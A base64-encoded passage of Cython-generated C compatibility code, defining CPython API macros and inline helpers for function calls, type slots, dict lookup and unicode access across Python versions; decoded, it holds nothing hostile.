G4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzTm9uZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc05vbmUob2IpIFB5X0lzTm9uZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNOb25lKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9Ob25lKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzVHJ1ZSlcbiAgI2RlZmluZSBfX1B5eF9QeV9Jc1RydWUob2IpIFB5X0lzVHJ1ZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNUcnVlKG9iKSBfX1B5eF9QeV9Jcygob2IpLCBQeV9UcnVlKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDBCMSB8fCBkZWZpbmVkKFB5X0lzRmFsc2UpXG4gICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgUHlfSXNGYWxzZShvYilcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlfSXNGYWxzZShvYikgX19QeXhfUHlfSXMoKG9iKSwgUHlfRmFsc2UpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfTm9uZUFzTnVsbChvYmopICAoX19QeXhfUHlfSXNOb25lKG9iaikgPyBOVUxMIDogKG9iaikpXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBGMCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG4gICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobylcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykgX1B5R0NfRklOQUxJWkVEKG8pXG4jZW5kaWZcbiNpZm5kZWYgUHlfVFBGTEFHU19DSEVDS1RZUEVTXG4gICNkZWZpbmUgUHlfVFBGTEFHU19DSEVDS1RZUEVTIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0hBVkVfSU5ERVhcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfSU5ERVggMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkVcbiAgI2RlZmluZSBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUgMFxuI2VuZGlmXG4jaWZuZGVmIFB5X1RQRkxBR1NfU0VRVUVOQ0VcbiAgI2RlZmluZSBQeV9UUEZMQUdTX1NFUVVFTkNFIDBcbiNlbmRpZlxuI2lmbmRlZiBQeV9UUEZMQUdTX01BUFBJTkdcbiAgI2RlZmluZSBQeV9UUEZMQUdTX01BUFBJTkcgMFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfU1RBQ0tMRVNTXG4gICNkZWZpbmUgTUVUSF9TVEFDS0xFU1MgMFxuI2VuZGlmXG4jaWZuZGVmIE1FVEhfRkFTVENBTExcbiAgI2lmbmRlZiBNRVRIX0ZBU1RDQUxMXG4gICAgICNkZWZpbmUgTUVUSF9GQVNUQ0FMTCAweDgwXG4gICNlbmRpZlxuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCkgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIFB5X3NzaXplX3QgbmFyZ3MpO1xuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcykgKFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpO1xuI2Vsc2VcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTRcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBQeUNGdW5jdGlvbkZhc3RcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHNcbiAgI2Vsc2VcbiAgIyAgZGVmaW5lIF9fUHl4X1B5Q0Z1bmN0aW9uRmFzdCBfUHlDRnVuY3Rpb25GYXN0XG4gICMgIGRlZmluZSBfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMgX1B5Q0Z1bmN0aW9uRmFzdFdpdGhLZXl3b3Jkc1xuICAjZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfTUVUSF9GQVNUQ0FMTCBNRVRIX0ZBU1RDQUxMXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgX19QeXhfUHlDRnVuY3Rpb25GYXN0XG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMgX19QeXhfUHlDRnVuY3Rpb25GYXN0V2l0aEtleXdvcmRzXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X01FVEhfRkFTVENBTEwgTUVUSF9WQVJBUkdTXG4gICNkZWZpbmUgX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGwgUHlDRnVuY3Rpb25cbiAgI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcyBQeUNGdW5jdGlvbldpdGhLZXl3b3Jkc1xuI2VuZGlmXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbiAgI2RlZmluZSBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2ZWN0b3JjYWxsZnVuY1xuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICBQeVZlY3RvcmNhbGxfTkFSR1MoKHNpemVfdCkobikpXG4jZWxpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICB0eXBlZGVmIFB5T2JqZWN0ICooKl9fcHl4X3ZlY3RvcmNhbGxmdW5jKShQeU9iamVjdCAqY2FsbGFibGUsIFB5T2JqZWN0ICpjb25zdCAqYXJncyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpO1xuICAjZGVmaW5lIF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCAgKChzaXplX3QpMSA8PCAoOCAqIHNpemVvZihzaXplX3QpIC0gMSkpXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICAoKFB5X3NzaXplX3QpKCgoc2l6ZV90KShuKSkgJiB+X19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUICAwXG4gICNkZWZpbmUgX19QeXhfUHlWZWN0b3JjYWxsX05BUkdTKG4pICAoKFB5X3NzaXplX3QpKG4pKVxuI2VuZGlmXG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBCMVxuI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpXG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUNGdW5jdGlvbl9DaGVja0V4YWN0KGZ1bmMpICBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAgUHlDRnVuY3Rpb25fQ2hlY2soZnVuYylcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiNkZWZpbmUgX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSAgKCgoUHlDRnVuY3Rpb25PYmplY3QqKShmdW5jKSktPm1fbWwtPm1sX21ldGgpXG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpICBQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYylcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuI2RlZmluZSBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICAoKChQeUNGdW5jdGlvbk9iamVjdCopKGZ1bmMpKS0+bV9tbC0+bWxfZmxhZ3MpXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0dFVF9TRUxGKFB5T2JqZWN0ICpmdW5jKSB7XG4gICAgcmV0dXJuIChfX1B5eF9DeU9yUHlDRnVuY3Rpb25fR0VUX0ZMQUdTKGZ1bmMpICYgTUVUSF9TVEFUSUMpID8gTlVMTCA6ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX3NlbGY7XG59XG4jZW5kaWZcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ0Z1bmN0aW9uKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHJldHVybiBQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSAmJiBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgUHlDRnVuY3Rpb25fR0VUX0ZVTkNUSU9OKGZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG4jZW5kaWZcbn1cbiNkZWZpbmUgX19QeXhfSXNTYW1lQ0Z1bmN0aW9uKGZ1bmMsIGNmdW5jKSAgIF9fUHl4X19Jc1NhbWVDRnVuY3Rpb24oZnVuYywgY2Z1bmMpXG4jaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMobSwgcywgYikgICgodm9pZCltLCBQeVR5cGVfRnJvbVNwZWNXaXRoQmFzZXMocywgYikpXG4gIHR5cGVkZWYgUHlPYmplY3QgKigqX19QeXhfUHlDTWV0aG9kKShQeU9iamVjdCAqLCBQeVR5cGVPYmplY3QgKiwgUHlPYmplY3QgKmNvbnN0ICosIHNpemVfdCwgUHlPYmplY3QgKik7XG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9Gcm9tTW9kdWxlQW5kU3BlYyhtLCBzLCBiKSAgUHlUeXBlX0Zyb21Nb2R1bGVBbmRTcGVjKG0sIHMsIGIpXG4gICNkZWZpbmUgX19QeXhfUHlDTWV0aG9kICBQeUNNZXRob2RcbiNlbmRpZlxuI2lmbmRlZiBNRVRIX01FVEhPRFxuICAjZGVmaW5lIE1FVEhfTUVUSE9EIDB4MjAwXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgIWRlZmluZWQoUHlPYmplY3RfTWFsbG9jKVxuICAjZGVmaW5lIFB5T2JqZWN0X01hbGxvYyhzKSAgIFB5TWVtX01hbGxvYyhzKVxuICAjZGVmaW5lIFB5T2JqZWN0X0ZyZWUocCkgICAgIFB5TWVtX0ZyZWUocClcbiAgI2RlZmluZSBQeU9iamVjdF9SZWFsbG9jKHApICBQeU1lbV9SZWFsbG9jKHApXG4jZW5kaWZcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pXG4jZWxpZiBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMXG4gICNkZWZpbmUgX19QeXhfUHlDb2RlX0hhc0ZyZWVWYXJzKGNvKSAgKFB5Q29kZV9HZXROdW1GcmVlKGNvKSA+IDApXG4gICNkZWZpbmUgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKGZyYW1lLCBsaW5lbm8pIF9QeUZyYW1lX1NldExpbmVOdW1iZXIoKGZyYW1lKSwgKGxpbmVubykpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5Q29kZV9IYXNGcmVlVmFycyhjbykgIChQeUNvZGVfR2V0TnVtRnJlZShjbykgPiAwKVxuICAjZGVmaW5lIF9fUHl4X1B5RnJhbWVfU2V0TGluZU51bWJlcihmcmFtZSwgbGluZW5vKSAgKGZyYW1lKS0+Zl9saW5lbm8gPSAobGluZW5vKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZGVmaW5lIF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudCBQeVRocmVhZFN0YXRlX0dldCgpXG4jZWxpZiAhQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50IFB5VGhyZWFkU3RhdGVfR0VUKClcbiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTFcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgUHlUaHJlYWRTdGF0ZV9HZXRVbmNoZWNrZWQoKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVRocmVhZFN0YXRlX0N1cnJlbnQgX1B5VGhyZWFkU3RhdGVfVW5jaGVja2VkR2V0KClcbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkICpfX1B5eF9fUHlNb2R1bGVfR2V0U3RhdGUoUHlPYmplY3QgKm9wKVxue1xuICAgIHZvaWQgKnJlc3VsdDtcbiAgICByZXN1bHQgPSBQeU1vZHVsZV9HZXRTdGF0ZShvcCk7XG4gICAgaWYgKCFyZXN1bHQpXG4gICAgICAgIFB5X0ZhdGFsRXJyb3IoIkNvdWxkblwndCBmaW5kIHRoZSBtb2R1bGUgc3RhdGUiKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2RlZmluZSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShvKSAoX19weXhfbXN0YXRldHlwZSAqKV9fUHl4X19QeU1vZHVsZV9HZXRTdGF0ZShvKVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUob3ApICgodm9pZClvcCxfX3B5eF9tc3RhdGVfZ2xvYmFsKVxuI2VuZGlmXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0dldFNsb3Qob2JqLCBuYW1lLCBmdW5jX2N0eXBlKSAgX19QeXhfUHlUeXBlX0dldFNsb3QoUHlfVFlQRSgoUHlPYmplY3QgKikgb2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfVHJ5R2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KFB5X1RZUEUob2JqKSwgbmFtZSwgZnVuY19jdHlwZSlcbiNkZWZpbmUgX19QeXhfUHlPYmplY3RfR2V0U3ViU2xvdChvYmosIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QoUHlfVFlQRShvYmopLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpXG4jZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KFB5X1RZUEUob2JqKSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpICAoKHR5cGUpLT5uYW1lKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9HZXRTbG90KHR5cGUsIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSAoKCh0eXBlKS0+c3ViKSA/ICgodHlwZSktPnN1Yi0+bmFtZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9UcnlHZXRTdWJTbG90KHR5cGUsIHN1YiwgbmFtZSwgZnVuY19jdHlwZSkgX19QeXhfUHlUeXBlX0dldFN1YlNsb3QodHlwZSwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKVxuI2Vsc2VcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfR2V0U2xvdCh0eXBlLCBuYW1lLCBmdW5jX2N0eXBlKSAgKChmdW5jX2N0eXBlKSBQeVR5cGVfR2V0U2xvdCgodHlwZSksIFB5XyMjbmFtZSkpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSlcXFxuICAgICgoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwIHx8XFxcbiAgICAgKFB5VHlwZV9HZXRGbGFncyh0eXBlKSAmIFB5X1RQRkxBR1NfSEVBUFRZUEUpIHx8IF9fUHl4X2dldF9ydW50aW1lX3ZlcnNpb24oKSA+PSAweDAzMEEwMDAwKSA/XFxcbiAgICAgX19QeXhfUHlUeXBlX0dldFNsb3QodHlwZSwgbmFtZSwgZnVuY19jdHlwZSkgOiBOVUxMKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRTdWJTbG90KG9iaiwgc3ViLCBuYW1lLCBmdW5jX2N0eXBlKSBfX1B5eF9QeVR5cGVfR2V0U2xvdChvYmosIG5hbWUsIGZ1bmNfY3R5cGUpXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX1RyeUdldFN1YlNsb3Qob2JqLCBzdWIsIG5hbWUsIGZ1bmNfY3R5cGUpIF9fUHl4X1B5VHlwZV9UcnlHZXRTbG90KG9iaiwgbmFtZSwgZnVuY19jdHlwZSlcbiNlbmRpZlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiB8fCBkZWZpbmVkKF9QeURpY3RfTmV3UHJlc2l6ZWQpXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgKChuIDw9IDgpID8gUHlEaWN0X05ldygpIDogX1B5RGljdF9OZXdQcmVzaXplZChuKSlcbiNlbHNlXG4jZGVmaW5lIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKSAgUHlEaWN0X05ldygpXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfRGl2aWRlKHgseSkgICAgICAgICBQeU51bWJlcl9UcnVlRGl2aWRlKHgseSlcbiNkZWZpbmUgX19QeXhfUHlOdW1iZXJfSW5QbGFjZURpdmlkZSh4LHkpICBQeU51bWJlcl9JblBsYWNlVHJ1ZURpdmlkZSh4LHkpXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIENZVEhPTl9VU0VfVU5JQ09ERV9JTlRFUk5BTFNcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSkgIF9QeURpY3RfR2V0SXRlbV9Lbm93bkhhc2goZGljdCwgbmFtZSwgKChQeUFTQ0lJT2JqZWN0ICopIG5hbWUpLT5oYXNoKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiAgICBQeU9iamVjdCAqcmVzID0gX19QeXhfUHlEaWN0X0dldEl0ZW1TdHJXaXRoRXJyb3IoZGljdCwgbmFtZSk7XG4gICAgaWYgKHJlcyA9PSBOVUxMKSBQeUVycl9DbGVhcigpO1xuICAgIHJldHVybiByZXM7XG59XG4jZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAyMDAwMFxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvciAgUHlEaWN0X0dldEl0ZW1XaXRoRXJyb3JcbiNkZWZpbmUgX19QeXhfUHlEaWN0X0dldEl0ZW1TdHIgICAgICAgICAgIFB5RGljdF9HZXRJdGVtXG4jZWxzZVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKiBfX1B5eF9QeURpY3RfR2V0SXRlbVN0cldpdGhFcnJvcihQeU9iamVjdCAqZGljdCwgUHlPYmplY3QgKm5hbWUpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFlcbiAgICByZXR1cm4gUHlEaWN0X0dldEl0ZW0oZGljdCwgbmFtZSk7XG4jZWxzZVxuICAgIFB5RGljdEVudHJ5ICplcDtcbiAgICBQeURpY3RPYmplY3QgKm1wID0gKFB5RGljdE9iamVjdCopIGRpY3Q7XG4gICAgbG9uZyBoYXNoID0gKChQeVN0cmluZ09iamVjdCAqKSBuYW1lKS0+b2Jfc2hhc2g7XG4gICAgYXNzZXJ0KGhhc2ggIT0gLTEpO1xuICAgIGVwID0gKG1wLT5tYV9sb29rdXApKG1wLCBuYW1lLCBoYXNoKTtcbiAgICBpZiAoZXAgPT0gTlVMTCkge1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIGVwLT5tZV92YWx1ZTtcbiNlbmRpZlxufVxuI2RlZmluZSBfX1B5eF9QeURpY3RfR2V0SXRlbVN0ciAgICAgICAgICAgUHlEaWN0X0dldEl0ZW1cbiNlbmRpZlxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0cCkgICAoKChQeVR5cGVPYmplY3QgKil0cCktPnRwX2ZsYWdzKVxuICAjZGVmaW5lIF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIGZlYXR1cmUpICAoKF9fUHl4X1B5VHlwZV9HZXRGbGFncyh0eXBlKSAmIChmZWF0dXJlKSkgIT0gMClcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfUHlUeXBlX0dldEZsYWdzKHRwKSAgIChQeVR5cGVfR2V0RmxhZ3MoKFB5VHlwZU9iamVjdCAqKXRwKSlcbiAgI2RlZmluZSBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZSh0eXBlLCBmZWF0dXJlKSAgUHlUeXBlX0hhc0ZlYXR1cmUodHlwZSwgZmVhdHVyZSlcbiNlbmRpZlxuI2RlZmluZSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpICBfX1B5eF9QeU9iamVjdF9HZXRTbG90KGl0ZXJhdG9yLCB0cF9pdGVybmV4dCwgaXRlcm5leHRmdW5jKVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwXG4jZGVmaW5lIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG9iaikgIHtcXFxuICAgIFB5VHlwZU9iamVjdCAqdHlwZSA9IFB5X1RZUEUoKFB5T2JqZWN0KilvYmopO1xcXG4gICAgYXNzZXJ0KF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKHR5cGUsIFB5X1RQRkxBR1NfSEVBUFRZUEUpKTtcXFxuICAgIFB5T2JqZWN0X0dDX0RlbChvYmopO1xcXG4gICAgUHlfREVDUkVGKHR5cGUpO1xcXG59XG4jZWxzZVxuI2RlZmluZSBfX1B5eF9QeUhlYXBUeXBlT2JqZWN0X0dDX0RlbChvYmopICBQeU9iamVjdF9HQ19EZWwob2JqKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUmVhZENoYXIodSwgaSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUodSkgICAoKHZvaWQpdSwgMTExNDExMVUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0tJTkQodSkgICAgICAgICAoKHZvaWQpdSwgKDApKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9EQVRBKHUpICAgICAgICAgKCh2b2lkKil1KVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEKGssIGQsIGkpICAgKCh2b2lkKWssIFB5VW5pY29kZV9SZWFkQ2hhcigoUHlPYmplY3QqKShkKSwgaSkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKHUpKVxuI2Vsc2VcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9SRUFEWShvcCkgICAgICAgKDApXG4gICNlbHNlXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfUkVBRFkob3ApICAgICAgIChsaWtlbHkoUHlVbmljb2RlX0lTX1JFQURZKG9wKSkgP1xcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwIDogX1B5VW5pY29kZV9SZWFkeSgoUHlPYmplY3QgKikob3ApKSlcbiAgI2VuZGlmXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQURfQ0hBUih1LCBpKSBQeVVuaWNvZGVfUkVBRF9DSEFSKHUsIGkpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpICAgUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKHUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0tJTkQodSkgICAgICAgICAoKGludClQeVVuaWNvZGVfS0lORCh1KSlcbiAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfREFUQSh1KSAgICAgICAgIFB5VW5pY29kZV9EQVRBKHUpXG4gICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX1JFQUQoaywgZCwgaSkgICBQeVVuaWNvZGVfUkVBRChrLCBkLCBpKVxuICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9XUklURShrLCBkLCBpLCBjaCkgIFB5VW5pY29kZV9XUklURShrLCBkLCBpLCAoUHlfVUNTNCkgY2gpXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwXG4gICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfSVNfVFJVRSh1KSAgICAgICgwICE9IFB5VW5pY29kZV9HRVRfTEVOR1RIKHUpKVxuICAjZWxzZVxuICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMFxuICAgICNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0lTX1RSVUUodSkgICAgICAoMCAhPSAobGlrZWx5KFB5VW5pY29kZV9JU19SRUFEWSh1KSkgPyBQeVVuaWNvZGVfR0VUX0xFTkdUSCh1KSA6ICgoUHlDb21wYW